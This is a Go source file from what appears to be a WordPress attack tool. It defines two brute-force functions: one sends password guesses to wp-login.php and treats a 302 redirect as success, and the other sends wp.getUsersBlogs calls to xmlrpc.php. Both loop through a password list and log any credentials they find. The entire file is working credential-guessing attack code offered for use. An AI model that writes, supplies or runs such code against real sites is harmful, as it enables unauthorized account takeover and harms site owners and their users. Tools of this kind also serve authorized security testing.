package fuzzing

import (
	"net/http"
	"strings"

	"github.com/institute-atri/ghttp"
	"github.com/institute-atri/glogger"
)

func Passive(url, username string, passwords []string) {
	glogger.Info("Performing passive brute force attack...")

	request := ghttp.NewHttp()

	err := request.SetURL(url + "wp-login.php")
	glogger.ErrorHandling(err)

	err = request.SetMethod("POST")
	glogger.ErrorHandling(err)

	request.SetContentType("application/x-www-form-urlencoded")

	var done bool

	for _, password := range passwords {
		request.SetData("log=" + username + "&pwd=" + password + "&wp-submit=Acessar&redirect_to=" + url + "testcookie=1")

		request.SetRedirectFunc(func(req *http.Request, via []*http.Request) error {
			if req.Response.StatusCode == 302 {
				done = true
			}

			return nil
		})

		_, err := request.Do()
		glogger.ErrorHandling(err)

		if done {
			glogger.Done("Login successful:\nUsername: " + username + "\nPassword: " + password)
			break
		}
	}

	if !done {
		glogger.Danger("User password not found!")
	}
}

func Aggressive(url, username string, passwords []string) {
	glogger.Info("Performing aggressive brute force attack...")

	request := ghttp.NewHttp()

	err := request.SetURL(url + "xmlrpc.php")
	glogger.ErrorHandling(err)

	err = request.SetMethod("POST")
	glogger.ErrorHandling(err)

	var done bool

	for _, password := range passwords {
		request.SetData("<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>" + username + "</value></param><param><value>" + password + "</value></param></params></methodCall>")

		response, err := request.Do()
		glogger.ErrorHandling(err)

		if strings.Contains(strings.ToLower(response.BRaw), "admin") {
			glogger.Done("Login successful:\nUsername: " + username + "\nPassword: " + password)

			done = true

			break
		}
	}

	if !done {
		glogger.Danger("User password not found!")
	}
}
